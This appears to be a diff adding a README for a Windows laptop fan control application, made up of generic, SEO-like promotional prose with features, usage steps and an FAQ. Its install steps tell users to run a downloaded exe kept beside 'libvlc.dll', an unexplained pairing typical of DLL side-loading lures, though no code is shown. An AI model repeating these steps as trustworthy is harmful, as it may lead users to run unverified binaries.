@@ -1,0 +1,143 @@
+Notebook Fan Control is a free, open-source Windows laptop fan control application designed to help users manage cooling, customize fan speeds, and maintain better thermal performance. Configure notebook-specific cooling profiles through a convenient graphical interface without needing command-line tools.
+
+⬇️ Installation
+
+Download the Windows application
+
+1. Open the repository's Releases page.
+2. Download the latest release archive Notebook Fan Control for Windows 4.4.4.zip.
+3. Extract the archive into a folder of your choice.
+4. Keep Notebook Fan Control for Windows 4.4.4.exe and libvlc.dll together in that folder.
+5. Double-click Notebook Fan Control for Windows 4.4.4.exe to launch the application.
+
+✨ Features
+
+- 🌬️ Custom Fan Speed Control — Adjust supported laptop cooling fans using configurable speed settings and hardware-specific control profiles.
+- 💻 Laptop Model Compatibility — Use dedicated hardware configurations to support different notebook manufacturers and models.
+- 🌡️ Temperature Monitoring — Keep track of available thermal sensor readings and understand your laptop's cooling behavior.
+- ⚙️ Custom Cooling Profiles — Configure fan behavior with adjustable parameters tailored to your notebook hardware.
+- 🔄 Automatic Fan Regulation — Apply supported automatic control strategies to respond to changing system temperatures.
+- 🛠️ Hardware Configuration Management — Organize, customize, and maintain notebook-specific fan control configurations.
+- 🖥️ Windows Desktop Interface — Manage cooling settings through a straightforward graphical application instead of a command-line workflow.
+
+🖼️ Overview
+
+The application brings notebook cooling configuration and fan management together in one desktop experience.
+
+Designed for practical laptop cooling
+
+| Capability | Description |
+|---|---|
+| Fan management | Configure supported fan control parameters |
+| Cooling profiles | Select and customize hardware profiles |
+| Temperature data | Review available thermal information |
+| Hardware support | Use configurations for compatible notebook models |
+| Desktop operation | Manage settings through a graphical interface |
+
+Compatibility note: Fan control depends on the laptop's embedded controller, firmware, hardware implementation, and available configuration. Not every notebook supports direct fan speed adjustment.
+
+🚀 Usage
+
+1. Launch the application — Open Notebook Fan Control on your Windows computer.
+2. Identify your laptop — Find a compatible notebook configuration for your hardware model.
+3. Select a cooling profile — Choose an appropriate configuration before changing fan behavior.
+4. Review temperature readings — Check the available thermal information and current cooling behavior.
+5. Adjust fan settings — Customize supported fan control parameters carefully.
+6. Monitor the results — Observe temperatures and fan operation to ensure stable cooling.
+
+💡 Configuration tips
+
+- Always start with a profile intended for your exact laptop model.
+- Avoid disabling automatic cooling safeguards.
+- Make small adjustments rather than applying aggressive fan settings immediately.
+- Monitor CPU and GPU temperatures during demanding workloads.
+- Restore the default configuration if unexpected thermal behavior occurs.
+
+🧩 Compatibility and Supported Hardware
+
+Notebook Fan Control uses hardware-specific configuration to accommodate differences between notebook models.
+
+Actual functionality depends on:
+
+- Embedded controller capabilities.
+- Laptop BIOS and firmware implementation.
+- Available temperature and fan sensors.
+- Manufacturer-specific hardware behavior.
+- The completeness and accuracy of the selected configuration.
+
+A configuration that works on one notebook model may not be appropriate for another, even when both laptops share the same manufacturer.
+
+🔒 Security and Privacy
+
+Your computer's hardware settings deserve careful handling.
+
+- No telemetry: No built-in behavioral tracking or analytics collection.
+- No unnecessary tracking: The application is designed around local desktop functionality.
+- Open-source transparency: Source code can be inspected and independently audited.
+- Hardware safety: Use compatible configurations and avoid unsafe fan settings.
+- Responsible reporting: Report bugs, compatibility problems, and potential security concerns through the GitHub issue tracker.
+
+Only use configurations appropriate for your specific notebook. Incorrect embedded-controller settings can affect cooling behavior and hardware stability.
+
+🤝 Contributing
+
+Contributions help improve notebook compatibility, configuration quality, and the overall Windows laptop cooling experience.
+
+Ways to contribute include:
+
+- 🐛 Reporting application bugs and compatibility problems.
+- 💻 Testing supported notebook configurations.
+- 📝 Improving documentation and usage instructions.
+- ⚙️ Submitting corrections to hardware profiles.
+- 🔧 Contributing code improvements and maintenance fixes.
+
+When submitting a compatibility report, include your laptop manufacturer, exact model, Windows version, and relevant diagnostic information.
+
+Please review the repository's contribution guidelines before opening a pull request.
+
+❓ Frequently Asked Questions
+
+Is Notebook Fan Control free?
+
+Yes. It is an open-source desktop application distributed under the MIT License.
+
+Does it work with every Windows laptop?
+
+No. Fan control depends on hardware compatibility and the availability of suitable notebook configurations.
+
+Can I manually control laptop fan speed?
+
+On supported hardware, configurable profiles allow users to adjust fan control behavior.
+
+Does it support automatic fan regulation?
+
+Automatic regulation is available where the selected hardware configuration and supported control functionality permit it.
+
+Can I use the same configuration on different laptops?
+
+Not necessarily. Embedded controllers and firmware implementations differ between models. Always verify compatibility before applying a profile.
+
+Does it require command-line knowledge?
+
+No. The application provides a graphical Windows desktop experience for managing supported settings.
+
+Why is my fan speed not changing?
+
+Possible causes include an incompatible profile, unsupported embedded-controller functionality, firmware restrictions, or insufficient hardware access permissions.
+
+🗺️ Project Roadmap
+
+Potential areas for future development include:
+
+- Expanded notebook model configuration coverage.
+- Improved thermal monitoring and diagnostics.
+- More accessible cooling profile management.
+- Better configuration validation.
+- Additional Windows compatibility improvements.
+- Enhanced documentation for hardware contributors.
+
+📄 License
+
+Released under the MIT License. See the LICENSE file for details.
+
+Take control of compatible notebook cooling with free, open-source Windows fan management software.
